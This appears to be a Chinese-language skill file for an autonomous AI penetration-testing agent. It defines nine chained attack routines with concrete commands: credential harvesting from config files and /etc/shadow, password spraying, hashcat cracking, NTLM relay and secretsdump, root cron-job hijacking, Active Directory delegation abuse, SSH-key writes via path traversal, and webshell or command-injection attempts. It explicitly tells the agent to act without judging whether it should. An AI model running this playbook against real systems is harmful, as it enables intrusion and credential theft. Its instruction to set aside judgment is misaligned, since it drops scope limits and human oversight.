---
name: 'chain-primitives'
description: '链接类型微操作 L1-L9：发现原语→匹配链接类型→执行固定操作序列→产出新原语。不分场景，命中就执行。'
whenToUse: '发现攻击原语后：匹配链接类型 L1-L9 并执行固定操作序列。'
metadata: { domain: meta, tier: T1 }
---

# Skill: chain-primitives
> 🔴 链接类型微操作：发现原语 → 匹配链接类型 → 执行固定操作序列 → 产出新原语。不分场景，不判断"该不该做"——命中就执行。
(scope: project)

---

## 🔧 执行前工具预检（每次执行链接类型前 ≤ 5 秒）

```
🔴 不是只在初始化时检查一次 — 是每次调用 L1-L9 前都快速检查:

ntlmrelayx:  python3 -c "from impacket.examples import ntlmrelayx" 2>&1
             → setRPCOptions 报错 → sed 修复 (粘滞点表)
             → 普通 import 报错 → venv 激活 (/tmp/venv_imp/bin/activate)
responder:    which responder || apt install -y responder
hashcat:      hashcat --help >/dev/null 2>&1
john:         john --help >/dev/null 2>&1
mosquitto:    mosquitto_sub --help >/dev/null 2>&1

🔴 5秒内修不好 → [TOOL_BROKEN] → 跳过此工具 → 用替代:
   ntlmrelayx 坏 → 试 Responder + 手动 relay (python socket)
   hashcat 坏 → 试 john → 都不行 → relay 优先
```

## L1 — 文件读 → 配置 → 密码

```
触发: 拿到任意文件读能力 (LFI/文件下载/shell cat)
① find /var/www /opt /etc /home -type f \( -name ".env" -o -name "*.conf" -o -name "*.ini" -o -name "*.xml" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null
② grep -rIE '(password|passwd|secret|key|DATABASE_URL|connectionString|token|api_key)' 每个结果
③ 同时: cat ~/.bash_history /etc/shadow /proc/self/environ 2>/dev/null
④ 🔴 每找到一个密码 → 立刻触发 L2 (喷洒) — 不等读完所有文件
```

## L2 — 凭据 → 喷洒

```
触发: 拿到任何用户名+密码 / hash
① 构建用户列表: /etc/passwd (有shell的) / AD用户 (enum4linux/bloodyAD) / web用户 / DB用户
② 构建目标列表: SSH→SMB→WinRM→RDP→Web登录→DB→所有内部API
③ 🔴 一个密码 → 立刻试所有用户。一个用户 → 立刻试所有目标。
④ 每个配对只发一个请求。成功 → 标记 [GATE_OPEN] → 递归。
```

## L3 — Hash → Crack → 明文

```
触发: 拿到 NTLM/SHA/bcrypt/PBKDF2/NetNTLMv2 等 hash
① hashid 识别 → hashcat mode: NTLM=-m1000, NetNTLMv2=-m5600, bcrypt=-m3200
② 第一轮: rockyou.txt (30s) → 第二轮: rockyou + best64.rule → 第三轮: 主题词变体
③ 🔴 NTLMv2 → 不要只 crack — 先试 relay (L4)，两者并行
④ 破解成功 → 密码触发 L2 (喷洒)。失败 → 标记 [CRACK_FAILED] → relay 继续
```

## L4 — NTLM → Relay → 认证

```
触发: Responder/ntlmrelayx 捕获到 NTLM 认证请求
① nxc smb <IP> --shares → 检查 SMB signing
② signing=False → ntlmrelayx -t smb://<IP> -smb2support
   signing=True  → ntlmrelayx -t ldaps://<DC> --delegate-access
③ 触发源 (MQTT注入/coercion) → 重新触发 → 等 ≤120s
④ relay 成功 → LDAP: 写RBCD/shadow creds。SMB: secretsdump。HTTP: SOCKS→浏览目标
⑤ 🔴 3 次 relay 无回连 → 重新构造触发 payload (换路径/换端口/换格式)
```

## L5 — Shell → localhost 发现 → 新攻击面

```
触发: 拿到任何 shell
① ss -tlnp (Linux) / netstat -ano (Windows) → 列出所有监听端口
② 🔴 每个 localhost 端口 → 隧道转发出来 → 当做全新目标:
   → 查 service-attacks 速查表 → 版本检测 → 默认凭据 → CVE search
③ 优先级: 数据库 > 消息队列 > 内部API > 监控面板 > 其他
④ 🔴 每发现一个内部服务 → 递归进入全攻击流程
```

## L6 — Cron/Systemd/Timer → 劫持 → Root

```
触发: 发现以 root 运行的定时任务 (cron/systemd timer/watchdog)
① systemctl list-timers; crontab -l; ls /etc/cron.*; find /etc/systemd -name "*.service"
② 读每个脚本源码 → 找: 可写路径/os.path.join/subprocess无全路径/通配符/可控输入
③ 可写脚本 → echo payload >> 脚本。路径穿越 → symlink 链。命令注入 → 注入 cron 行。
④ 等待下一次执行 → 观察效果。无效果 → 换下一个定时任务。
```

## L7 — AD 对象操控 → 横向/提权

```
触发: 拥有对 AD 对象 (用户/计算机/组) 的写权限
① bloodhound → 看谁对此对象有控制权 → 看此对象控制谁
② 路径: GenericWrite → Shadow Credentials/Targeted Kerberoast
   WriteDacl → RBCD。AddMember → 加进高权限组。
   CreateChild on OU + GenericWrite → BetterSuccessor
③ 执行 → 拿到新凭据/新会话 → 触发 L2 (喷洒) → 递归
```

## L8 — 路径穿越 → 写敏感文件

```
触发: 发现 os.path.join / zip slip / git对象 / 文件上传可控路径
① 验证: ../ 是否被过滤? → 有 → 试双编码 %252e%252e / Unicode ..
② 目标 (按优先级): /root/.ssh/authorized_keys → /home/*/.ssh/ → crontab → sudoers.d
③ 🔴 只写合法 payload (SSH公钥/cron行/sudo规则)。不写 webshell 当目标不是 web 目录。
④ 写成功 → 访问新权限 (SSH→shell / cron→root cmd / sudo→root) → 递归
```

## L9 — API/服务配置错误 → RCE

```
触发: 发现 HTTP 服务 + 无认证/弱认证 + 有 API 端点
① searchsploit <产品> <版本> → msfconsole → GitHub: "<产品> <版本> exploit"
② 无 CVE → 测试默认凭据 → 测试所有无认证端点 → SQLi/XSS/SSRF/命令注入
③ 🔴 有文件上传 → 试 webshell。有模板引擎 → 试 SSTI。有执行环境 → 试命令注入。
④ 成功 → 拿 shell → L5 (localhost发现) → 递归
```

```
Arch: v2.2 — 9种链接类型, 每种≤15行, 触发→操作→产出→递归
```
